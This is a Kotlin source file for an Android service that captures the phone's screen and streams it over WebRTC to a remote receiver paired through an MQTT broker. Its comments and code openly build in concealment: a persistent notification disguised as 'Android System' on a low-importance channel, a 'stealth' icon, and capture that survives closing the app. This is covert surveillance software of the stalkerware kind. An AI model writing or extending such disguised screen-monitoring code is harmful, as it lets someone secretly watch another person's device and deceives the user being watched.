package com.screenmirror.sender.sender

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.screenmirror.sender.MainActivity
import com.screenmirror.sender.R
import com.screenmirror.sender.signaling.MqttSignalingClient
import com.screenmirror.sender.signaling.SignalingMessage
import com.screenmirror.sender.webrtc.WebRtcManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.launchIn
import kotlinx.coroutines.flow.onEach
import kotlinx.coroutines.launch
import org.webrtc.EglBase
import org.webrtc.EglBase14

/**
 * Foreground service that:
 *  1) Holds MediaProjection + WebRTC capture running even when app is killed from recents
 *  2) Connects to MQTT signaling broker as peer (peerId = service UUID)
 *  3) On receiver_hello, creates PeerConnection via WebRtcManager
 *  4) Receives incoming signaling messages, routes to WebRtcManager
 *
 * Stealth: notification is disguised as "Android System" with low-importance channel.
 */
class ScreenCaptureService : Service() {

    companion object {
        const val EXTRA_PAIRING_CODE = "pairing_code"
        const val EXTRA_MEDIA_PROJECTION_INTENT = "media_projection_intent"
        private const val TAG = "ScreenCaptureService"
        private const val NOTIF_ID = 4242
        private const val CHANNEL_ID = "android_system_service"
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var signaling: MqttSignalingClient? = null
    private var webRtcManager: WebRtcManager? = null
    private var signalingJob: Job? = null
    private var eglBase: EglBase? = null

    override fun onCreate() {
        super.onCreate()
        createStealthNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val pairingCode = intent?.getStringExtra(EXTRA_PAIRING_CODE)
        val mpIntent: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent?.getParcelableExtra(EXTRA_MEDIA_PROJECTION_INTENT, Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent?.getParcelableExtra(EXTRA_MEDIA_PROJECTION_INTENT)
        }
        if (pairingCode == null || mpIntent == null) {
            Log.e(TAG, "Missing pairing code or media projection intent")
            stopSelf()
            return START_NOT_STICKY
        }
        startForeground(NOTIF_ID, buildStealthNotification())
        startCapture(pairingCode, mpIntent)
        return START_STICKY
    }

    private fun startCapture(pairingCode: String, mpIntent: Intent) {
        scope.launch {
            try {
                eglBase = org.webrtc.EglBase.create()
                val mqtt = MqttSignalingClient(pairingCode)
                mqtt.connect()
                signaling = mqtt

                val manager = WebRtcManager(
                    context = this@ScreenCaptureService,
                    eglBase = eglBase!!,
                    signaling = mqtt,
                    mediaProjectionIntent = mpIntent
                )
                manager.initialize()
                webRtcManager = manager

                // Listen for incoming messages
                signalingJob = mqtt.incomingMessages.onEach { msg ->
                    routeIncomingMessage(msg)
                }.launchIn(scope)
            } catch (e: Exception) {
                Log.e(TAG, "Capture setup failed", e)
                stopSelf()
            }
        }
    }

    private fun routeIncomingMessage(msg: SignalingMessage) {
        // Only handle messages addressed to me (peerId) or broadcasted (empty to)
        if (msg.to.isNotEmpty() && msg.to != signaling?.myId) return
        webRtcManager?.handleIncomingMessage(msg)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "onDestroy")
        signalingJob?.cancel()
        webRtcManager?.dispose()
        scope.launch { signaling?.disconnect() }
        eglBase?.release()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ----- Stealth notification -----

    private fun createStealthNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(
                CHANNEL_ID,
                "Android System",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background system service"
                setShowBadge(false)
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(chan)
        }
    }

    private fun buildStealthNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            else PendingIntent.FLAG_UPDATE_CURRENT
        )
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Android System")
                .setContentText("System service running")
                .setSmallIcon(R.drawable.ic_stealth_icon)
                .setContentIntent(pi)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_LOW)
                .build()
        } else {
            Notification.Builder(this)
                .setContentTitle("Android System")
                .setContentText("System service running")
                .setSmallIcon(R.drawable.ic_stealth_icon)
                .setContentIntent(pi)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_LOW)
                .build()
        }
    }
}
